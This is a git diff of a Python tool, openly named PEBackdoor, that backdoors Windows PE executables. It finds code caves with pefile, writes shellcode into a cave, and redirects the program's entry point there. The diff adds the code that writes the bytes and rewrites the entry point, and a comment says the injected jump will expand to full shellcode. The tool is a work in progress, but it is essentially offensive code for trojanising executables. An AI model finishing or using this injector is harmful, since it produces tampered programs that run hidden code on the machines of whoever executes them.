@@ -61,15 +61,18 @@ def info(file_name):
 
 #injects just the last jump so far, will expand to 
 #create all shell code
-def append_jump(file_name, shell_code, output, start):
+def append_jump(file_name, shellcode, output, start):
     to_jmp = (start - 4).to_bytes(3, 'little')
 
     shellcode = bytes(b"\xE9") + to_jmp
 
     return shellcode
 
-def write_shellcode():
+def write_shellcode(pe, offset, shellcode):
     print("writing shellcode")
+    pe.set_bytes_at_offset(offset, shellcode)
+
+
 
 
 def interactive():
@@ -79,7 +82,7 @@ def interactive():
     parser.add_argument("-f", "--file", dest="file_name", action="store", required=True,
                         help="PE file", type=str)
 
-    parser.add_argument("-s", "--shell", dest="shell_code", action="store", default=" ",
+    parser.add_argument("-s", "--shell", dest="shellcode", action="store", default=" ",
                         help="shell code", type=str)
 
     parser.add_argument("-o", "--out", dest="output", action="store", default="out.exe",
@@ -94,17 +97,27 @@ def interactive():
     if args.info:
         info(args.file_name)
     else:
-        PEBackdoor(args.file_name, args.shell_code, args.output)    
+        PEBackdoor(args.file_name, args.shellcode, args.output)    
 
-def PEBackdoor(pe_path, shell_code, output, interactive = False):
+def PEBackdoor(pe_path, shellcode, output, interactive = False):
     print("main function called")
     pe = pefile.PE(pe_path)
     original_start = pe.OPTIONAL_HEADER.AddressOfEntryPoint
     print(hex(original_start))
-    append_jump(pe_path, 'aa', 'aa', original_start)
+    new_shellcode = append_jump(pe_path, '', '', original_start)
+    print(new_shellcode)
     pe.close()
     caves = code_caves(150, pe_path)
     print(caves)
+
+
+    pe = pefile.PE(pe_path)
+    write_shellcode(pe,caves[0].location,new_shellcode)
+    pe.OPTIONAL_HEADER.AddressOfEntryPoint = caves[0].location
+    caves[0].print_cave()
+    pe.write(output)
+
+
 
 if __name__ == "__main__":
     interactive()
